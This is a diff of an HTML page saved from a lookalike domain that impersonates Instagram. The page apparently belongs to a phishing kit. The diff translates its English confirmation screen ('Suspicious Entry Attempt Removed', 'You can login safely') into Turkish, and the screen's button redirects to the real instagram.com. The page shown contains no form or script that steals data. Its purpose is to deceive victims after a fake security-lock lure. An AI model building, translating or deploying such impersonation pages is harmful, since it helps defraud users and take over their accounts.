@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <!-- saved from url=(0075)https://ww.w-instagrams.com/accounts/help/security/locked/login/confirm.php -->
 <html lang="tr" class="js not-logged-in client-root"><!--<![endif]--><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
@@ -62,10 +62,11 @@ Violation Request Canceled! • Instagram
 
         
 
-    <span id="react-root"><section data-reactroot="" class="_dn8zj"><div class="_92x7j"><div class="_p1gq2 _1z3vs"><header class="_exvmm"><div class="_jz5s1"><div class="_5ojg4"><header class="_l1b8m">   </header></div></div><div class="_gqjc9"><div class="_6v8vp _erzi3"><div class="_df358"><div class="_jha5b"><div class="_om391"><img src="./confirm_files/PrNdO7.png" alt="instagram" style="width:160px;height:40px;float:right;"></div></div><div class="_nhei4"><div class="_2q6w5"></div></div></div></div></div></header><div class="_4v45q _mz9ex"><div class="_emv0v"><p class="_gbtbx">Your account has been approved.</p></div></div><div><div class="_enirw"><h2 class="_s8o7u">Suspicious Entry Attempt Removed.
+    <span id="react-root"><section data-reactroot="" class="_dn8zj"><div class="_92x7j"><div class="_p1gq2 _1z3vs"><header class="_exvmm"><div class="_jz5s1"><div class="_5ojg4"><header class="_l1b8m">   </header></div></div><div class="_gqjc9"><div class="_6v8vp _erzi3"><div class="_df358"><div class="_jha5b"><div class="_om391"><img src="./confirm_files/PrNdO7.png" alt="instagram" style="width:160px;height:40px;float:right;"></div></div><div class="_nhei4"><div class="_2q6w5"></div></div></div></div></div></header><div class="_4v45q _mz9ex"><div class="_emv0v"><p class="_gbtbx">Hesabınız onaylandı.
+</p></div></div><div><div class="_enirw"><h2 class="_s8o7u">Şüpheli Giriş Denemesi Kaldırıldı.
 
-</h2><p class="_3574j _ar8ie"><!-- react-text: 31 -->You can login safely to your account.</p>&nbsp;</div><span class="_9qe39 _7k49n"></span></div><form method="link" action="http://www.instagram.com/" class="_2sw2p"><!-- react-empty: 26 --><span class="_9qe39 _7k49n"><button class="_ah57t _84y62 _i46jh _rmr7s">
-Log in</button></span></form></div></div></section></span>
+</h2><p class="_3574j _ar8ie"><!-- react-text: 31 -->Hesabınıza güvenle giriş yapabilirsiniz.</p>&nbsp;</div><span class="_9qe39 _7k49n"></span></div><form method="link" action="http://www.instagram.com/" class="_2sw2p"><!-- react-empty: 26 --><span class="_9qe39 _7k49n"><button class="_ah57t _84y62 _i46jh _rmr7s">
+Giriş Yap</button></span></form></div></div></section></span>
 
         
 
